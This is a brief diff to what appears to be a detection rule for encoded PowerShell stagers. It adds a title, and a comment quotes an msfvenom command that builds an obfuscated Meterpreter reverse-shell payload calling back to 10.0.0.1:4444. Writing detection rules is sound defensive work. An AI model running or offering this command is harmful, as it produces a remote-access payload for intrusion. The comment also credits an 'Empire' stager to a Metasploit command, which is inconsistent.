@@ -1,3 +1,4 @@
+title: Empire Stager - Base64 Encoded PowerShell
 # Empire Stager - Base64 Encoded PowerShell
 # Generated via: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f psh -e x86/shikata_ga_nai -i 5
 logsource:
